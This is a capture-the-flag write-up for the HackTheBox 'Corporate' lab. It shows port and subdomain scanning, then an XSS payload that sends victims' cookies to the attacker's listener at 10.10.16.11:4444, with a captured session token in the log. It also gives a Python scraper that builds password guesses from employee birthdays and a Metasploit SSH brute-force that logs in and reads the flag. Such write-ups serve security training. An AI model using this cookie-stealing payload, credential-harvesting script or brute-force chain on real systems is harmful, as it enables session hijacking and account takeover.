# HackTheBox Corporate

Insane level CTF lab machine of the HackTheBox platform running Linux OS, where we will get only  the user flag.

## Service Overview

First, let's scan the 10.10.11.246 machine for open ports using the nmap utility:

```shell
$ nmap -p- --min-rate 10000 10.10.11.246

Nmap scan report for 10.10.11.246
Host is up (0.069s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
```

## Web Service

To evaluate a web service, we will need to write vhost to our /etc/hosts:

```shell
$ echo "10.10.11.246 corporate.htb" | sudo tee -a /etc/hosts
```

Next, we find subdomain:

```shell
$ wfuzz -H "Host: FUZZ.corporate.htb" --hw 11 -c -z file,"/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" http://corporate.htb/

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://corporate.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000034:200   38 L     175 W      1725 Ch     "support"
000000262:403   7 L      9 W        159 Ch      "git"
000000286:302   0 L      4 W        38 Ch       "sso"
000000845:302   0 L      4 W        32 Ch       "people"

Total time: 48.52939
Processed Requests: 4989
Filtered Requests: 4985
Requests/sec.: 102.8036
```

## XSS

I saw an xss payload while browsing the forum and stole it directly:

```shell
<a href="http://corporate.htb/<script+src='/vendor/analytics.min.js'></script><script+src='/assets/js/analytics.min.js?v=document.location=`http://10.10.16.11:4444/${document.cookie}`'</script>" id="send-message">
```

Start your own python service and get cookies in the chat window `http://support.corporate.htb`:

```shell
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.246 - - [29/Dec/2023 12:50:21] code 404, message File not found
10.10.11.246 - - [29/Dec/2023 12:50:21] "GET /CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MDM4NDcwMDYsImV4cCI6MTcwMzkzMzQwNn0.wC7OZGED72dUFXhIVvRu88L2qZZoJRUwINdO3aXwOec HTTP/1.1" 404 -
```

There is cors here, and the cookie is used to log in to the `http://people.corporate.htb/auth/login` subdomain. Set cookie and open `http://people.corporate.htb/`:

## People

Get another VPN `julio-daniel.ovpn` at `http://people.corporate.htb/sharing`:

```shell
http://people.corporate.htb/sharing/file/217
```

Connect to VPN and scan network:

```shell
$ openvpn3 session-start --config julio-daniel.ovpn


$ nmap --iflist
************************INTERFACES************************
DEV    (SHORT)  IP/MASK                                 TYPE        UP MTU   MAC
tun1   (tun1)   10.8.0.3/24                             point2point up 1500
tun1   (tun1)   fe80::94e3:6dae:b5a9:3996/64            point2point up 1500

**************************ROUTES**************************
DST/MASK                                 DEV    METRIC GATEWAY
10.8.0.0/24                              tun1   0
10.9.0.0/24                              tun1   0      10.8.0.1


$ nmap -p- --min-rate 10000 10.9.0.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-29 13:57 EET
Stats: 0:00:06 elapsed; 254 hosts completed (2 up), 2 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 37.88% done; ETC: 13:58 (0:00:10 remaining)
Stats: 0:00:13 elapsed; 254 hosts completed (2 up), 2 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 71.77% done; ETC: 13:58 (0:00:05 remaining)
Nmap scan report for 10.9.0.1
Host is up (0.060s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
636/tcp  open  ldapssl
2049/tcp open  nfs
3004/tcp open  csoftragent
3128/tcp open  squid-http
8006/tcp open  wpl-analytics

Nmap scan report for 10.9.0.4
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
```

## Sharing

Seeing that there is a file sharing function, here is a new XSS cookie (because it cannot be shared with myself). After blasting, look at your sharing and you can see that a PDF has a password policy.

Write the script to cooperate with msf or hydra blasting:

```python
import re
import requests

start = 5000
end = 6000
userpasswordlist_file = "userpasswordlist.txt"

custom_cookie = "session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; session.sig=O4i1nbo9UgiVH2d86vOi2NBKw1w; CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MDM4NDcwMDYsImV4cCI6MTcwMzkzMzQwNn0.wC7OZGED72dUFXhIVvRu88L2qZZoJRUwINdO3aXwOec"
headers = {"Cookie": custom_cookie}
# Loop through URLs and match mailboxes and birthday dates
for i in range(start, end + 1):
    url = f"http://people.corporate.htb/employee/{i}"
    response = requests.get(url, headers=headers)
    content = response.text

    # Match mailboxes and save to userlist.txt
    email_match = re.search(r'<a href="mailto:(.*?)">', content)

    # Match birthday date and save to password.txt
    birthday_match = re.search(
        r'<th scope="row">Birthday</th>\s+<td>(.*?)</td>', content
    )
    if birthday_match and email_match:
        email = email_match.group(1).split("@")[0]
        birthday = birthday_match.group(1)
        match = re.match(r"(\d+)/(\d+)/(\d+)", birthday)
        month = match.group(1)
        day = match.group(2)
        year = match.group(3)

        birthday = day + month + year
        with open(userpasswordlist_file, "a") as file:
            file.write(email + " CorporateStarter" + birthday + "\n")
```

```shell
$ cat userpasswordlist.txt
ward.pfannerstill CorporateStarter451971
oleta.gutmann CorporateStarter11111965
kian.rodriguez CorporateStarter861957
jacey.bernhard CorporateStarter1051990
veda.kemmer CorporateStarter14111980
raphael.adams CorporateStarter2812001
stevie.rosenbaum CorporateStarter20101987
halle.keeling CorporateStarter2221982
ross.leffler CorporateStarter1141963
marcella.kihn CorporateStarter9101959
joy.gorczany CorporateStarter2311992
larissa.wilkinson CorporateStarter1051979
skye.will CorporateStarter16101965
gideon.daugherty CorporateStarter1921969
amie.torphy CorporateStarter2631953
katelyn.swift CorporateStarter2671954
lila.mcglynn CorporateStarter10101982
estelle.padberg CorporateStarter24101989
kacey.krajcik CorporateStarter2511954
tanner.kuvalis CorporateStarter1911969
elwin.jones CorporateStarter441987
anastasia.nader CorporateStarter241957
morris.lowe CorporateStarter1861983
leanne.runolfsdottir CorporateStarter1121963
gayle.graham CorporateStarter20101990
dylan.schumm CorporateStarter2621967
richie.cormier CorporateStarter2311964
marge.frami CorporateStarter1062002
erna.lindgren CorporateStarter4111951
callie.goldner CorporateStarter1451967
uriel.hahn CorporateStarter25121992
ally.effertz CorporateStarter281996
annamarie.flatley CorporateStarter1371994
candido.mcdermott CorporateStarter3031973
scarlett.herzog CorporateStarter2261995
estrella.wisoky CorporateStarter421975
adrianna.stehr CorporateStarter861997
abbigail.halvorson CorporateStarter1791965
august.gottlieb CorporateStarter1491992
harley.ratke CorporateStarter2451978
laurie.casper CorporateStarter18111959
arch.ryan CorporateStarter29121960
dayne.ruecker CorporateStarter551965
abigayle.kessler CorporateStarter21101982
katelin.keeling CorporateStarter2541989
penelope.mcclure CorporateStarter831968
rachelle.langworth CorporateStarter1961998
america.kirlin CorporateStarter29121957
garland.denesik CorporateStarter1211992
cathryn.weissnat CorporateStarter8122002
elwin.mills CorporateStarter14111957
beth.feest CorporateStarter13101996
mohammed.feeney CorporateStarter4111974
bethel.hessel CorporateStarter29121984
nya.little CorporateStarter2161965
kasey.walsh CorporateStarter781999
stephen.schamberger CorporateStarter2731979
dessie.wolf CorporateStarter731999
mabel.koepp CorporateStarter2321995
christian.spencer CorporateStarter26111966
esperanza.kihn CorporateStarter2341956
justyn.beahan CorporateStarter1961981
josephine.hermann CorporateStarter2051970
sadie.greenfelder CorporateStarter2111964
zaria.kozey CorporateStarter1241970
antwan.bernhard CorporateStarter152002
hector.king CorporateStarter30101987
brody.wiza CorporateStarter1471992
jammie.corkery CorporateStarter941997
hermina.leuschke CorporateStarter1571986
julio.daniel CorporateStarter2311987
candido.hackett CorporateStarter221987
dangelo.koch CorporateStarter23111986
nora.brekke CorporateStarter1811996
margarette.baumbach CorporateStarter2331999
michale.jakubowski CorporateStarter2571989
cecelia.west CorporateStarter2441986
rosalee.schmitt CorporateStarter471990
```

```shell
$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ssh/ssh_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set userpass_file userpasswordlist.txt
userpass_file => userpasswordlist.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set rhosts 10.9.0.4
rhosts => 10.9.0.4
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> exploit

[*] 10.9.0.4:22 - Starting bruteforce
[+] 10.9.0.4:22 - Success: 'laurie.casper:CorporateStarter18111959' 'uid=5041(laurie.casper) gid=5041(laurie.casper) groups=5041(laurie.casper),504(consultant) Linux corporate-workstation-04 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.8.0.4:32783 -> 10.9.0.4:22) at 2023-12-29 15:28:20 +0200

laurie.casper@corporate-workstation-04:~$ id
id
uid=5041(laurie.casper) gid=5041(laurie.casper) groups=5041(laurie.casper),504(consultant)
laurie.casper@corporate-workstation-04:~$ ls
ls
user.txt
laurie.casper@corporate-workstation-04:~$ cat user.txt
cat user.txt
81626debec34ab320ce034112192d5de
laurie.casper@corporate-workstation-04:~$
``` 

```shell
$ ssh laurie.casper@10.9.0.4
CorporateStarter18111959

laurie.casper@corporate-workstation-04:~$ id
uid=5041(laurie.casper) gid=5041(laurie.casper) groups=5041(laurie.casper),504(consultant)
laurie.casper@corporate-workstation-04:~$ ls
user.txt
laurie.casper@corporate-workstation-04:~$ cat user.txt
81626debec34ab320ce034112192d5de
laurie.casper@corporate-workstation-04:~$
```